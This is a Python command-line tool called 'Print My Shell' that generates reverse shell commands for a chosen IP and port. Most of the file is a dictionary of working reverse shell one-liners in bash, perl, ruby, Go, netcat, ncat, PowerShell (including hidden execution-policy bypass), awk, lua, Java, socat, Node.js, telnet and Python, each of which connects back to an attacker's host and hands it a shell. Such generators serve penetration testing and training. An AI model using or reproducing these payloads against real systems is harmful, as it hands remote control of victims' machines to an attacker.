#!/usr/bin/env python3
import argparse
import sys

DEFAULT_IP = "10.0.0.1"
DEFAULT_PORT = "1234"

BANNER = r'''
  ___     _     _     __  __        ___ _        _ _ 
 | _ \_ _(_)_ _| |_  |  \/  |_  _  / __| |_  ___| | |
 |  _/ '_| | ' \  _| | |\/| | || | \__ \ ' \/ -_) | |
 |_| |_| |_|_||_\__| |_|  |_|\_, | |___/_||_\___|_|_|
                             |__/ [by Sameera Madushan & Gobidev]                 

'''

'''
- Reverse Shells From - 
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
'''
SHELL_DICT = {

    "bash": [
        'bash -i >& /dev/tcp/{0}/{1} 0>&1',
        '0<&196;exec 196<>/dev/tcp/{0}/{1}; sh <&196 >&196 2>&196'
    ],

    "perl": [
        'perl -e \'use Socket;$i="{0}";$p={1};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
        'perl -MIO -e \'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
        'NOTE: Windows only\nperl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"{0}:{1}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\'',
    ],

    "ruby": [
        'ruby -rsocket -e\'f=TCPSocket.open("{0}",{1}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\'',
        'ruby -rsocket -e \'exit if fork;c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
        'NOTE: Windows only\nruby -rsocket -e \'c=TCPSocket.new("{0}","{1}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
    ],

    "golang": [
        'echo \'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{0}:{1}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}\' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go',
    ],

    "nc": [
        'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {0} {1} >/tmp/f',
    ],

    "nce": [
        'nc -e /bin/sh {0} {1}',
    ],

    "ncat": [
        'ncat {0} {1} -e /bin/bash',
        'ncat --udp {0} {1} -e /bin/bash',
    ],

    "powershell": [
        'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{0}",{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
        'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'{0}\',{1});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"',
    ],

    "awk": [
        'awk \'BEGIN {{s = "/inet/tcp/0/{0}/{1}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}\' /dev/null',
    ],

    "lua": [
        'lua -e "require(\'socket\');require(\'os\');t=socket.tcp();t:connect(\'{0}\',\'{1}\');os.execute(\'/bin/sh -i <&3 >&3 2>&3\');"',
        'lua5.1 -e \'local host, port = "{0}", {1} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()\'',
    ],

    "java": [
        'r = Runtime.getRuntime();p = r.exec(["/bin/sh","-c","exec 5<>/dev/tcp/{0}/{1};cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor();',
    ],

    "socat": [
        'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{0}:{1}',
        'socat tcp-connect:{0}:{1} system:/bin/sh',
    ],

    "nodejs": [
        '(function(){{var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var client=new net.Socket();client.connect({1},"{0}",function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();',
    ],

    "telnet": [
        'rm -f /tmp/p; mknod /tmp/p p && telnet {0} {1} 0/tmp/p',
    ],

    "python": [
        'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    ],

    "python3": [
        'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{0}",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\'',
    ]
}


def get_shell(shell_type: str, shell_ip: str, shell_port: int) -> str:
    """Return a reverse shell of a certain type with filled in ip and port"""
    
    # Test if type is in SHELL_DICT
    if shell_type not in SHELL_DICT:
        print(f"Unknown shell type: {shell_type}")
        exit(1)

    if not args.shellonly:
        print(f"\n[>] {shell_type} reverse shell [<]\n")

    # Get shells of type
    reverse_shells = SHELL_DICT[shell_type]
    
    output = ""

    for shell_syntax in reverse_shells:
        formatted_shell = shell_syntax.format(shell_ip, shell_port)
        if output:
            output += "\n\n"
        output += formatted_shell
        
        # Break after first shell if shellonly is specified
        if args.shellonly:
            break
    
    if not args.shellonly:
        output += "\n"
    return output
        

if __name__ == "__main__":

    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", type=str, help="IP address", dest='ipaddr')
    parser.add_argument("-p", "--port", type=int, help="Port number", dest='portnum')
    parser.add_argument("-t", "--type", type=str, help="Type of the reverse shell to generate", dest='type')
    parser.add_argument("-l", "--list", action="store_true", help="List all available shell types", dest='list')
    parser.add_argument("-a", "--all", action="store_true", help="Generate all the shells", dest='all')
    parser.add_argument("-s", "--shellonly", action="store_true", help="Disables all output other than the first shell"
                                                                       "of given type", dest="shellonly")

    # Parse arguments
    if sys.argv[1:]:
        args = parser.parse_args()
    else:
        print(BANNER)
        parser.parse_args(args=["--help"])
        args = None
        exit()

    # Print banner
    if not args.shellonly:
        print(BANNER)

    # Set ip and port
    ip = DEFAULT_IP
    port = DEFAULT_PORT

    if args.ipaddr or args.portnum is not None:
        ip = args.ipaddr
        port = args.portnum

    # Print shell of type if specified
    if args.type:
        print(get_shell(args.type, ip, port))

    # List all available shell types
    if args.list:
        print("\n[>] Available Shells [<]\n")
        for available_shell in SHELL_DICT:
            print(available_shell)
        print()

    # Print all shells if specified
    if args.all:
        for t in SHELL_DICT:
            print(get_shell(t, ip, port))
